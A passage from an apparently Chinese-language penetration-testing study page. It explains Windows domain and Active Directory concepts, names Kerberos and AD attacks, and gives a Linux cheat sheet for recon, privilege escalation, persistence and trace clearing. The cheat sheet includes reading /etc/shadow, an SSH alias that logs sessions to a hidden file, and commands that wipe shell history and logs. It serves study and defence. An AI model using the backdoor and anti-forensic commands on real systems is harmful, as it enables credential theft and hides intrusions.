title="用户"></a>用户</h4><p>Windows系统存在一些为了特定用途而设置的用户，分别是：SYSTEM(系统)、Trustedinstaller(信任程序模块)、Everyone(所有人)、Creator Owner(创建者)等，这些特殊用户不属于任何用户组，是完全独立的账户。其中SYSTEM拥有整台计算机管理权限的账户，一般操作无法获取与它等价的权限</p><h4 id="用户组"><a href="#用户组" class="headerlink" title="用户组"></a>用户组</h4><p>Windows系统内置了许多本地用户组，用于管理用户权限。只要用户账户加入到对应的用户组内，则用户账户也将具备对应用户组所拥有的权限</p><p>默认情况下，系统为用户分了7个组，并给每个组赋予不同的操作权限。这些组为：管理员组(Administrators)、高权限用户组(Power Users)、普通用户组(Users)、备份操作组(Backup Operators)、文件复制组(Replicator)、来宾用户组(Guests)、身份验证用户组(Authenticated Users)</p><h4 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h4><p>工作组（Workgroup）是最常用最简单最普遍的资源管理模式，默认情况下计算机都在名为workgroup的工作组中。工作组模式比较松散，适合网络中计算机数量较少，不需要严格管理的情况</p><h3 id="域中用户"><a href="#域中用户" class="headerlink" title="域中用户"></a>域中用户</h3><h4 id="域用户"><a href="#域用户" class="headerlink" title="域用户"></a>域用户</h4><p>域环境中的用户和本地用户的帐户不同，域用户帐户保存在活动目录中。在域环境中，一个域用户可以在域中的任何一台计算机上登录。在域中用户可以使用SID (Security Identifier) 来表明身份，用NTLM哈希或者Kerberos来验证身份</p><h4 id="机器用户"><a href="#机器用户" class="headerlink" title="机器用户"></a>机器用户</h4><p>机器用户也被称作机器账号或计算机账号，所有加入域的主机都会有一个机器用户，机器用户的用户名以 <code>$</code> 结尾</p><h3 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h3><p>组策略(Group Policy)用于控制用户帐户和计算机帐户的工作环境。组策略提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。其中本地的组策略(LGPO或LocalGPO)，可以在独立且非域的计算机上管理组策略对象。在域环境中的组策略通常被称作GPO(Group Policy Object)</p><h3 id="内网常用协议"><a href="#内网常用协议" class="headerlink" title="内网常用协议"></a>内网常用协议</h3><p>Windows查询名称解析的顺序为DNS、mDNS、LLMNR、NBNS</p><h4 id="NetBIOS"><a href="#NetBIOS" class="headerlink" title="NetBIOS"></a>NetBIOS</h4><p>NetBIOS（Network Basic Input&#x2F;Output System）是基于网络的交互协议，通常使用UDP 137、UDP 138、TCP 139等端口。Windows在安装TCP&#x2F;IP协议时会默认启用该协议，可能导致未设置权限校验的网络资源被访问</p><p>基于NetBIOS有NBNS (NetBIOS Name Service)服务，通常监听在UDP 137端口，该服务提供三种功能：将NetBIOS名称解析到IP、查询某一个NetBIOS节点的状态，注册&#x2F;释放一个NetBIOS名</p><p>可以使用 <code>nbtstat</code> 工具利用NetBIOS协议管理网络</p><h4 id="LLMNR"><a href="#LLMNR" class="headerlink" title="LLMNR"></a>LLMNR</h4><p>链路本地多播名称解析 (Link-Local Multicast Name Resolution, LLMNR)是一个基于DNS数据包格式的协议，IPv4和IPv6的主机可以通过此协议对同一本地链路上的主机执行名称解析。该协议在Windows Vista后被引入。 LLMNR监听UDP 5355端口，可以通过多播地址 224.0.0.252 (或 <code>FF02:0:0:0:0:0:1:3</code>) 访问</p><h4 id="mDNS"><a href="#mDNS" class="headerlink" title="mDNS"></a>mDNS</h4><p>mDNS (multicast DNS) 在Windows 10中被引入，监听UDP 5353端口，对应的多播地址为 224.0.0.251 ( <code>FF02::FB</code> ) 。mDNS主要实现了在没有传统DNS服务器的情况下使局域网内的主机实现相互发现和通信</p><h4 id="WPAD"><a href="#WPAD" class="headerlink" title="WPAD"></a>WPAD</h4><p>网络代理自动发现协议 (Web Proxy Auto-Discovery, WPAD) 是一种客户端使用DHCP和&#x2F;或DNS发现方法来定位一个配置文件URL的方法。在检测和下载配置文件后，它可以执行配置文件以测定特定URL应使用的代理</p><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>域指将网络中多台计算机逻辑上组织到一起，进行集中管理的逻辑环境。域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库</p><h4 id="域结构"><a href="#域结构" class="headerlink" title="域结构"></a>域结构</h4><h5 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h5><p>域树（Trees）由多个域组成，这些域共享同一表结构和配置，形成一个连续的命名空间（namespace）</p><h5 id="林"><a href="#林" class="headerlink" title="林"></a>林</h5><p>林（Forests）是一个复杂的AD实例，由一个或数个域组成，每个域树都有自己唯一的名称空间</p><h4 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h4><p>ADDS的目录存储在域控制器(Domain Controller)内，一个域内可以有多台域控制器，每一个域控制器的地位几乎是平等的，有几乎相同的数据库</p><p>在一台域控制器添加一个用户账户后，这个账户会被自动复制到其他域控制器的数据库中</p><p>AD数据库有多主机复制模式（Multi-master Replication Model）和单主机复制模式（Sing-master Replication Model）</p><p>多主机模式可以直接更新任何一台域控制器内的AD对象，并将更新之后的对象复制到其他域控制器，大部分数据都是用多主机模式进行复制</p><p>单主机复制模式是指由一台被称作操作主机（Operations Master）的域控制器负责接收更改数据的请求，并将数据复制到其他的域控制器</p><h4 id="信任"><a href="#信任" class="headerlink" title="信任"></a>信任</h4><p>两个域之间需要创建信任关系，才可以访问对应域内的资源</p><h5 id="域信任类型"><a href="#域信任类型" class="headerlink" title="域信任类型"></a>域信任类型</h5><p>Active Directory的信任方式可以分为以下几种：</p><p><strong>Tree-Root Trust</strong></p><ul><li>双向具有转移性</li></ul><p><strong>Parent-Child Trust</strong></p><ul><li>具有转移性，双向行人</li></ul><p><strong>Forest Trust</strong></p><ul><li>如果两个林创建了信任关系，则林中所有的域都相互信任</li><li>两个林之间的信任关系无法自动扩展到其他林上</li></ul><p><strong>Realm Trust</strong></p><ul><li>ADDS域可以和非Windows系统的Kerberos域之间创建信任</li></ul><p><strong>External Trust</strong></p><ul><li>位于两个林内的域之间可以通过外部信任来创建信任关系</li></ul><p><strong>Shortcut Trust</strong></p><ul><li>可以缩短验证用户身份的时间</li></ul><h4 id="OU"><a href="#OU" class="headerlink" title="OU"></a>OU</h4><p>组织单位（Organization Unit，OU）是一个容器对象，将域中的对象组织成逻辑组，帮助管理员管理。OU包含用户、计算机、工作组、打印机、安全策略以及其他组织单位等</p><h3 id="Active-Directory"><a href="#Active-Directory" class="headerlink" title="Active Directory"></a>Active Directory</h3><p>活动目录 (Active Directory，AD) 是面向Windows Server的目录服务。Active Directory存储了有关网络对象的信息，并且让管理员和用户能够查找和使用这些信息</p><h4 id="ADDS"><a href="#ADDS" class="headerlink" title="ADDS"></a>ADDS</h4><p>Active Directory提供目录服务的组件被称作Active Directory域服务 (Active Directory Domain Services, ADDS) ，负责目录数据库的存储、增删改查等工作，可以用在多种局域网、广域网的场景中</p><p>从逻辑上看，ADDS的组件可以分为Partition、Schema、Domain、Domain tree、Forest、OU、Container</p><p>Partition也被称为naming context，是AD DS数据库的一部分。Schema是存储在 ADDS 中数据的定义。Container是为ADDS提供组织框架的对象</p><p>从实现上区分，ADDS可以分为Domain controller、Data store、Global catalog server、RODC (Read-only domain controller) 、Site、Subnet</p><p>每个域控制器都有完整的ADDS数据，每个域控都可以处理数据的修改并同步至其他的域控</p><p>域控会有一份数据拷贝 (Data store) ，默认存储在 <code>C:\Windows\NTDS</code> 目录下</p><p>Global catalog server是存储全局catalog的域控，catlog以只读的方式存储了一个multiple-domain forest的所有对象，用于加速搜索</p><h4 id="名称空间"><a href="#名称空间" class="headerlink" title="名称空间"></a>名称空间</h4><p>名称空间 (namespace) 是一块界定好的区域，在区域内可以用名称找到与之相关的信息</p><h4 id="对象与属性"><a href="#对象与属性" class="headerlink" title="对象与属性"></a>对象与属性</h4><p>ADDS内的资源都是以对象 (Object) 的形式存在的，对象通过属性 (Attrbute) 来描述其特征</p><h3 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS"></a>ADCS</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>Active Directory 证书服务 (Active Directory Certificate Services，AD CS) 是微软用于实现 PKI 的服务</p><h4 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h4><p>ADCS 中的证书是 X.509 格式的数字签名文档，用于加密、签名或身份验证等</p><p>证书常用的属性由下述字段组成</p><ul><li>Subject：主题</li><li>Public Key：公钥</li><li>Extended Key Usages (EKUs)：扩展密钥，描述证书的对象标识符 (Object identifier, OID)</li></ul><p>常用的 EKU OID 包括：</p><p><strong>代码签名</strong></p><ul><li>OID 1.3.6.1.5.5.7.3.3</li><li>证书用于签署可执行代码</li></ul><p><strong>加密文件系统</strong></p><ul><li>OID 1.3.6.1.4.1.311.10.3.4</li><li>证书用于加密文件系统</li></ul><p><strong>安全电子邮件</strong></p><ul><li>OID 1.3.6.1.5.5.7.3.4</li><li>证书用于加密电子邮件</li></ul><p><strong>客户端身份验证</strong></p><ul><li>OID 1.3.6.1.5.5.7.3.2</li></ul><p><strong>智能卡登录</strong></p><ul><li>OID 1.3.6.1.4.1.311.20.2.2</li></ul><p><strong>服务器认证</strong></p><ul><li>OID 1.3.6.1.5.5.7.3.1</li><li>证书用于识别服务器 (例如HTTPS 证书)</li></ul><h5 id="证书模板"><a href="#证书模板" class="headerlink" title="证书模板"></a>证书模板</h5><p>微软提供了证书模板的功能，方便在域内签发证书。证书模板是注册策略和预定义证书设置的集合，包含证书有效期、用途、申请者等信息</p><h5 id="证书注册"><a href="#证书注册" class="headerlink" title="证书注册"></a>证书注册</h5><p>证书可以通过以下几种方式注册：</p><ul><li>通过 Windows 客户端证书注册协议 (MS-WCCE)</li><li>通过 ICertPassage 远程协议 (MS-ICPR)</li><li>在 ADCS 开启了对应 Web 服务的情况下，使用 Web 服务注册</li><li>在服务器安装了对应服务时，通过证书注册服务 (CES) 注册</li><li>在服务器安装了对应服务时，使用网络设备注册服务</li></ul><h3 id="组策略-1"><a href="#组策略-1" class="headerlink" title="组策略"></a>组策略</h3><h4 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h4><p>组策略 (Group Policy, GP) 用于管理网络环境中的用户和设备，定义了系统管理员管理工作所要的各种模板组件</p><p>组策略有以下功能：</p><ul><li>管理注册表</li><li>设置脚本</li><li>重定向文件夹</li><li>管理应用程序</li><li>指定安全选项</li></ul><h4 id="常用概念"><a href="#常用概念" class="headerlink" title="常用概念"></a>常用概念</h4><p>组策略容器 (Group Policy Container，GPC)存储在活动目录中，包含GPO属性、配置信息和版本等。可以通过GPC来查找GPT</p><p>组策略模板 (Group Policy Template, GPT) 存储在域控中，包含所有的组策略信息。包括管理模板，安全，脚本，软件安装等</p><p>其中GPC中的信息量少、容量小，GPT中消息量较大、容量大，因此两个部分分开存放。防止活动目录中因存储了过多的数据而被影响性能</p><p>组策略对象 (Group Policy Object, GPO) 是包含多种Windows组策略设置的集合，存储在GPC和GPT中</p><h3 id="Kerberos的Windows实现"><a href="#Kerberos的Windows实现" class="headerlink" title="Kerberos的Windows实现"></a>Kerberos的Windows实现</h3><h4 id="相关定义"><a href="#相关定义" class="headerlink" title="相关定义"></a>相关定义</h4><h5 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h5><p>服务主体名称 (ServicePrincipal Names, SPN) ，是服务实例(如HTTP、SMB等)的唯一标识符</p><p>SPN分为两种类型：一种是注册在活动目录的机器帐户下，当一个服务的权限为 Local System 或 Network Service，则SPN注册在机器帐户下。一种是注册在活动目录的域用户帐户下，当一个服务的权限为一个域用户，则SPN注册在域用户帐户下</p><h3 id="域内攻击思路"><a href="#域内攻击思路" class="headerlink" title="域内攻击思路"></a>域内攻击思路</h3><p><strong>获取域控权限</strong></p><ul><li>通过域控相关漏洞</li><li>抓hash，尤其是域管理员、运维等高权限账号的哈希</li></ul><p><strong>控制入域机器</strong></p><ul><li>下发恶意策略控制</li><li>获取域内用户凭证</li><li>利用错误的域管理配置</li><li>域内relay</li></ul><p><strong>获取服务票据</strong></p><ul><li>攻击Exchange等服务器</li></ul><h3 id="攻击类型"><a href="#攻击类型" class="headerlink" title="攻击类型"></a>攻击类型</h3><h4 id="黄金票据利用"><a href="#黄金票据利用" class="headerlink" title="黄金票据利用"></a>黄金票据利用</h4><p>在认证过程中，经过client与AS的通信会得到TGT，黄金票据（Golden Ticket）就是伪造票据授予票据（TGT），也被称为认证票据</p><p>黄金票据利用需要与DC通信，且需要获取krbtgt的hash，但是可以获取任何Kerbose服务权限</p><h4 id="白银票据利用"><a href="#白银票据利用" class="headerlink" title="白银票据利用"></a>白银票据利用</h4><p>白银票据（Silver Tickets）伪造利用的是Kerberos认证中的第三个步骤，在第三步的时候，client会带着ticket向server的某个服务进行请求，如果验证通过就可以访问server上的指定服务了，这里的ticket是基于client info、server session key、end time、server hash。这里client info已知，end time可以构造，server session key是TGS生成的，所以只要server的NTLM hash即可。银票伪造的是TGS，只能访问指定的服务</p><h4 id="DCSync-攻击"><a href="#DCSync-攻击" class="headerlink" title="DCSync 攻击"></a>DCSync 攻击</h4><p>域内有多台域控服务器时，为了同步域控服务器的修改，微软提供了基于远程目录协议 <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47">DRSR</a> 的同步机制</p><p>在多个域控服务器之间，每隔一段时间会有一次域数据的同步。由需要同步的域控服务器向其它服务器发送 GetNCChanges 请求，请求中包含需要同步的数据。数据量较多时，则重复这个过程</p><p>DCSync 就是使用这种机制进行域渗透的技术，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，在2015年添加到 mimikatz 的一个功能，可以导出域内所有用户的hash</p><p>这种方式需要满足以下任一一种权限：</p><ul><li>Administrators 组内的用户</li><li>Domain Admins 组内的用户</li><li>Enterprise Admins 组内的用户</li><li>域控制器的计算机帐户</li></ul><p>或者拥有特定的几条 DACL:</p><ul><li>DS-Replication-Get-Changes</li><li>DS-Replication-Get-Changes-All</li><li>DS-Replication-Get-Changes-In-Filtered-Set</li></ul><p>当没有管理员用户，但是拥有 WriteDACL 权限时，可以写入上述 DACL 来完成 DCSync</p><p>对于这种攻击，可以通过检测 GetNCChanges 发起者的方式，如果由非域控机器发起对应请求，则可以认为是 DCSync 攻击</p><h4 id="DCShadow-攻击"><a href="#DCShadow-攻击" class="headerlink" title="DCShadow 攻击"></a>DCShadow 攻击</h4><p>DCShadow是由来自法国的安全研究人员Benjamin Delpy和Vincent Le Toux在2018年的微软蓝帽（Blue Hat）大会上提出</p><p>DCShadow攻击指在Active Directory环境下创建一个恶意的域控制器，并用它来推送恶意对象</p><h4 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h4><p>哈希传递攻击（Pass-the-Hash，PTH）是通过传递NTLM哈希来认证的攻击方法，常用的工具有mimikatz等</p><h4 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h4><p>票据传递攻击（Pass-the-Ticket Attacks，PtT）是一种使用Kerberos票据代替明文密码或NTLM哈希的方法。PtT最常见的用途可能是使用黄金票据和白银票据，通过PtT访问主机相当简单</p><h4 id="Kerberoasting-Attacks"><a href="#Kerberoasting-Attacks" class="headerlink" title="Kerberoasting Attacks"></a>Kerberoasting Attacks</h4><p>Kerberoasting攻击由Tim Medin在2014 DerbyCon conference上 <a href="https://www.youtube.com/watch?v=PUyhlN-E5MU">公开</a> 。指域内的任何一台主机，都可以通过查询SPN，Kerberoasting即是向域内的所有服务请求TGS，然后进行暴力破解</p><h4 id="Roasting-AS-REP"><a href="#Roasting-AS-REP" class="headerlink" title="Roasting AS-REP"></a>Roasting AS-REP</h4><p>该攻击枚举域中不需要Kerberos预身份认证的帐户，向这些账户请求一条加密信息，并离线尝试获取到的账户哈希。该方式需要账户明确设置了 <code>DONT_REQ_PREAUTH</code></p><h4 id="Kerberos-Delegation-Attacks"><a href="#Kerberos-Delegation-Attacks" class="headerlink" title="Kerberos Delegation Attacks"></a>Kerberos Delegation Attacks</h4><p>在一个域中，A使用Kerberos身份验证访问服务B，B再使用A的身份去访问C，这个过程就可以理解为委派。委派主要分为非约束委派（Unconstrained delegation）和约束委派（Constrained delegation）两种，非约束委派可以访问域内任意其它服务，约束委派对认证做了限制不可以访问其他的服务</p><p>Kerberos Delegation（Kerberos委派）攻击分为非约束委派攻击和约束委派攻击。原理都是基于域内已经配置了委派的账户来获取其它账户的权限</p><h4 id="其他漏洞利用"><a href="#其他漏洞利用" class="headerlink" title="其他漏洞利用"></a>其他漏洞利用</h4><ul><li>域用户提权 (CVE-2022-26923)</li><li>KDC bamboozling (CVE-2021-42287)</li><li>Name impersonation (CVE-2021-42278)</li><li>ProxyShell (CVE-2021-34473)</li><li>ProxyLogon (CVE-2021-26855)</li><li>PrintNightmare (CVE-2021-1675 &#x2F; CVE-2021-34527)</li><li>SMBGhost (CVE-2020-0796)</li><li>Zerologon (CVE-2020-1472)</li><li>NTLM Relay (CVE-2019-1040)</li><li>永恒之蓝 (MS17-010)</li><li>域用户提权 (MS14-068)</li><li>Gpp漏洞 (MS14-025)</li><li>SAMR协议漏洞 (MS14-016)</li></ul><h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><ul><li>使用ATA等商业化防护工具</li><li>安装杀毒软件、EDR等工具</li><li>关闭高危服务</li><li>统一配置防火墙策略</li><li>对域控等高危账号使用白名单进行行为管理</li></ul><p><strong>检测高危操作</strong></p><ul><li>权限提升</li><li>高危账号密码修改、重置</li></ul><p><strong>行为频率建模</strong></p><ul><li>对大量尝试登录&#x2F;信息查询进行报警</li></ul><p><strong>对特定攻击行为进行监控</strong></p><ul><li>通过GPO下发自启动、计划任务</li></ul><h1 id="Linux内网渗透"><a href="#Linux内网渗透" class="headerlink" title="Linux内网渗透"></a>Linux内网渗透</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="获取内核、操作系统和设备信息"><a href="#获取内核、操作系统和设备信息" class="headerlink" title="获取内核、操作系统和设备信息"></a>获取内核、操作系统和设备信息</h3><p><strong>版本信息</strong></p><ul><li><code>uname -a</code> 所有版本</li><li><code>uname -r</code> 内核版本信息</li><li><code>uname -n</code> 系统主机名字</li><li><code>uname -m</code> Linux内核架构</li></ul><p><strong>内核信息</strong></p><ul><li><code>cat /proc/version</code></li></ul><p><strong>CPU信息</strong></p><ul><li><code>cat /proc/cpuinfo</code></li></ul><p><strong>发布信息</strong></p><ul><li><code>cat /etc/*-release</code></li><li><code>cat /etc/issue</code></li></ul><p><strong>主机名</strong></p><ul><li><code>hostname</code></li></ul><p><strong>文件系统</strong> </p><ul><li><code>df -a</code></li></ul><p><strong>内核日志</strong> </p><ul><li><code>dmesg</code> &#x2F; <code>/var/log/dmesg</code></li></ul><h3 id="用户和组"><a href="#用户和组" class="headerlink" title="用户和组"></a>用户和组</h3><ul><li><p>列出系统所有用户 <code>cat /etc/passwd</code></p></li><li><p>列出系统所有组 <code>cat /etc/group</code></p></li><li><p>列出所有用户hash（root）<code>cat /etc/shadow</code></p></li><li><p>查询用户的基本信息 <code>finger</code></p></li><li><p>当前登录的用户 <code>users</code> <code>who -a</code> <code>/var/log/utmp</code></p></li><li><p>查询无密码用户 <code>grep &#39;x:0:&#39; /etc/passwd</code></p></li><li><p>目前登录的用户 <code>w</code></p></li><li><p>登入过的用户信息 <code>last</code> &#x2F; <code>/var/log/wtmp</code></p></li><li><p>显示系统中所有用户最近一次登录信息 <code>lastlog</code> &#x2F; <code>/var/log/lastlog</code></p></li><li><p>登录成功日志 <code>/var/log/secure</code></p></li><li><p>登录失败日志 <code>/var/log/faillog</code></p></li><li><p>查看特权用户 <code>grep :0 /etc/passwd</code></p></li><li><p>查看passwd最后修改时间 <code>ls -l /etc/passwd</code></p></li><li><p>查看是否存在空口令用户 <code>awk -F: &#39;length($2)==0 &#123;print $1&#125;&#39; /etc/shadow</code></p></li><li><p>查看远程登录的账号 <code>awk &#39;/\$1|\$6/&#123;print $1&#125;&#39; /etc/shadow</code></p></li><li><p>查看具有sudo权限的用户</p></li><li><p><code>cat /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</code></p></li></ul><h3 id="用户和权限信息"><a href="#用户和权限信息" class="headerlink" title="用户和权限信息"></a>用户和权限信息</h3><ul><li>当前用户 <code>whoami</code></li><li>当前用户信息 <code>id</code></li><li>可以使用sudo提升到root的用户（root） <code>cat /etc/sudoers</code></li><li>列出目前用户可执行与无法执行的指令 <code>sudo -l</code></li></ul><h3 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h3><ul><li>打印系统环境信息 <code>env</code></li><li>打印系统环境信息 <code>set</code></li><li>环境变量中的路径信息 <code>echo $PATH</code></li><li>打印历史命令 <code>history</code> &#x2F; <code>~/.bash_history</code></li><li>显示当前路径 <code>pwd</code></li><li>显示默认系统遍历 <code>cat /etc/profile</code></li><li>显示可用的shell <code>cat /etc/shells</code></li></ul><h3 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h3><ul><li>查看进程信息 <code>ps aux</code></li><li>资源占有情况 <code>top -c</code></li><li>查看进程关联文件 <code>lsof -c $PID</code></li><li>完整命令行信息 <code>/proc/$PID/cmdline</code></li><li>进程的命令名 <code>/proc/$PID/comm</code></li><li>进程当前工作目录的符号链接 <code>/proc/$PID/cwd</code></li><li>运行程序的符号链接 <code>/proc/$PID/exe</code></li><li>进程的环境变量 <code>/proc/$PID/environ</code></li><li>进程打开文件的情况 <code>/proc/$PID/fd</code></li></ul><h3 id="服务信息"><a href="#服务信息" class="headerlink" title="服务信息"></a>服务信息</h3><ul><li>由inetd管理的服务列表 <code>cat /etc/inetd.conf</code></li><li>由xinetd管理的服务列表 <code>cat /etc/xinetd.conf</code></li><li>nfs服务器的配置 <code>cat /etc/exports</code></li><li>邮件信息 <code>/var/log/mailog</code></li><li>ssh配置 <code>sshd_config</code></li></ul><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><ul><li>显示指定用户的计划作业（root） <code>crontab -l -u %user%</code></li></ul><p><strong>计划任务</strong></p><ul><li><code>/var/spool/cron/*</code></li><li><code>/var/spool/anacron/*</code></li><li><code>/etc/crontab</code></li><li><code>/etc/anacrontab</code></li><li><code>/etc/cron.*</code></li><li><code>/etc/anacrontab</code></li></ul><p><strong>开机启动项</strong></p><ul><li><code>/etc/rc.d/init.d/</code></li></ul><h3 id="网络、路由和通信"><a href="#网络、路由和通信" class="headerlink" title="网络、路由和通信"></a>网络、路由和通信</h3><ul><li>列出网络接口信息 <code>/sbin/ifconfig -a</code> &#x2F; <code>ip addr show</code></li><li>列出网络接口信息 <code>cat /etc/network/interfaces</code></li><li>查看系统arp表 <code>arp -a</code></li><li>打印路由信息 <code>route</code> &#x2F; <code>ip ro show</code></li><li>查看dns配置信息 <code>cat /etc/resolv.conf</code></li><li>打印本地端口开放信息 <code>netstat -an</code></li><li>列出iptable的配置规则 <code>iptables -L</code></li><li>查看端口服务映射 <code>cat /etc/services</code></li><li>Hostname <code>hostname -f</code></li><li>查看进程端口情况 <code>netstat -anltp | grep $PID</code></li></ul><h3 id="已安装程序"><a href="#已安装程序" class="headerlink" title="已安装程序"></a>已安装程序</h3><ul><li><code>rpm -qa --last</code> Redhat</li><li><code>yum list | grep installed</code> CentOS</li><li><code>ls -l /etc/yum.repos.d/</code></li><li><code>dpkg -l</code> Debian</li><li><code>cat /etc/apt/sources.list</code> Debian APT</li><li><code>pkg_info</code> xBSD</li><li><code>pkginfo</code> Solaris</li><li><code>pacman -Q</code> Arch Linux</li><li><code>emerge</code> Gentoo</li></ul><h3 id="文件-1"><a href="#文件-1" class="headerlink" title="文件"></a>文件</h3><ul><li>最近五天的文件 <code>find / -ctime +1 -ctime -5</code></li><li>文件系统细节 <code>debugfs</code></li></ul><h3 id="公私钥信息"><a href="#公私钥信息" class="headerlink" title="公私钥信息"></a>公私钥信息</h3><ul><li><code>~/.ssh</code></li><li><code>/etc/ssh</code></li></ul><h3 id="日志-1"><a href="#日志-1" class="headerlink" title="日志"></a>日志</h3><ul><li><code>/var/log/boot.log</code></li><li><code>/var/log/cron</code></li><li><code>/var/log/faillog</code></li><li><code>/var/log/lastlog</code></li><li><code>/var/log/messages</code></li><li><code>/var/log/secure</code></li><li><code>/var/log/syslog</code></li><li><code>/var/log/syslog</code></li><li><code>/var/log/wtmp</code></li><li><code>/var/log/wtmp</code></li><li><code>/var/run/utmp</code></li></ul><h3 id="虚拟环境检测"><a href="#虚拟环境检测" class="headerlink" title="虚拟环境检测"></a>虚拟环境检测</h3><ul><li><code>lsmod | grep -i &quot;vboxsf\|vboxguest&quot;</code></li><li><code>lsmod | grep -i &quot;vmw_baloon\|vmxnet&quot;</code></li><li><code>lsmod | grep -i &quot;xen-vbd\|xen-vnif&quot;</code></li><li><code>lsmod | grep -i &quot;virtio_pci\|virtio_net&quot;</code></li><li><code>lsmod | grep -i &quot;hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc&quot;</code></li></ul><h3 id="容器内信息收集"><a href="#容器内信息收集" class="headerlink" title="容器内信息收集"></a>容器内信息收集</h3><ul><li><code>capsh --print</code></li><li><code>cat /proc/1/cgroup</code></li><li><code>env | grep KUBE</code></li><li><code>ls -l .dockerenv</code></li><li><code>ls -l /run/secrets/Kubernetes.io/</code></li><li><code>mount</code></li><li><code>ps aux</code></li></ul><h2 id="持久化-1"><a href="#持久化-1" class="headerlink" title="持久化"></a>持久化</h2><h3 id="权限提升-1"><a href="#权限提升-1" class="headerlink" title="权限提升"></a>权限提升</h3><ul><li>内核漏洞利用</li><li>攻击有root权限的服务</li><li>利用第三方服务提权</li></ul><p><strong>通过有SUID属性的可执行文件</strong></p><ul><li>查找可能提权的可执行文件</li><li><code>find / -perm +4000 -ls</code></li><li><code>find / -perm -u=s -type f 2&gt;/dev/null</code></li><li><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></li><li><code>find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \; 2&gt;/dev/null</code></li></ul><p><strong>利用可用的root权限</strong></p><ul><li><code>sudo -l</code></li></ul><h3 id="自启动-1"><a href="#自启动-1" class="headerlink" title="自启动"></a>自启动</h3><ul><li>&#x2F;etc&#x2F;init.d</li><li>&#x2F;etc&#x2F;rc.d&#x2F;rc.local</li><li>~&#x2F;.bashrc</li><li>~&#x2F;.zshrc</li></ul><h3 id="后门-1"><a href="#后门-1" class="headerlink" title="后门"></a>后门</h3><p><strong>ssh 后门</strong></p><ul><li><code>alias ssh=&#39;strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh&#39;</code></li><li>后门账户</li></ul><p><strong>常见应用</strong></p><ul><li><p>ICMP</p></li><li><p>DNS</p></li><li><p>icmp后门</p></li><li><p>后门端口复用</p></li><li><p><code>.</code> 开头隐藏文件</p></li><li><p>rootkit</p></li></ul><h2 id="痕迹清理-1"><a href="#痕迹清理-1" class="headerlink" title="痕迹清理"></a>痕迹清理</h2><h3 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h3><ul><li><code>unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null;</code></li><li><code>kill -9 $$</code> kill history</li><li><code>history -c</code></li><li>在 <code>HISTSIZE=0</code> 中设置 <code>HISTSIZE=0</code></li></ul><h3 id="清除-修改日志文件"><a href="#清除-修改日志文件" class="headerlink" title="清除&#x2F;修改日志文件"></a>清除&#x2F;修改日志文件</h3><ul><li><code>/var/log/btmp</code></li><li><code>/var/log/lastlog</code></li><li><code>/var/log/wtmp</code></li><li><code>/var/log/utmp</code></li><li><code>/var/log/secure</code></li><li><code>/var/log/message</code></li></ul><h3 id="登录痕迹"><a href="#登录痕迹" class="headerlink" title="登录痕迹"></a>登录痕迹</h3><ul><li><p>删除 <code>~/.ssh/known_hosts</code> 中记录</p></li><li><p>修改文件时间戳<code>touch –r</code></p></li><li><p>删除tmp目录临时文件</p></li></ul><h3 id="操作痕迹"><a href="#操作痕迹" class="headerlink" title="操作痕迹"></a>操作痕迹</h3><ul><li>vim 不记录历史命令 <code>:set history=0</code></li><li><ul><li>ssh 登录痕迹，无痕登录 <code>ssh -T user@host /bin/bash -i</code></li></ul></li></ul><h3 id="覆写文件"><a href="#覆写文件" class="headerlink" title="覆写文件"></a>覆写文件</h3><ul><li>shred</li><li>dd</li><li>wipe</li></ul><h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><ul><li>攻击和入侵很难完全删除痕迹，没有日志记录也是一种特征</li><li>即使删除本地日志，在网络设备、安全设备、集中化日志系统中仍有记录</li><li>留存的后门包含攻击者的信息</li><li>使用的代理或跳板可能会被反向入侵</li></ul><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul><li>在操作前检查是否有用户在线</li><li>删除文件使用磁盘覆写的功能删除</li><li>尽量和攻击前状态保持一致</li></ul><h2 id="综合技巧"><a href="#综合技巧" class="headerlink" title="综合技巧"></a>综合技巧</h2><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p><strong>windows</strong></p><ul><li>lcx</li><li>netsh</li></ul><p><strong>linux</strong></p><ul><li>portmap</li><li>iptables</li></ul><p><strong>socket代理</strong></p><ul><li>Win: xsocks</li><li>Linux: proxychains</li></ul><p><strong>基于http的转发与socket代理(低权限下的渗透)</strong></p><ul><li>端口转发: tunna</li><li>socks代理: 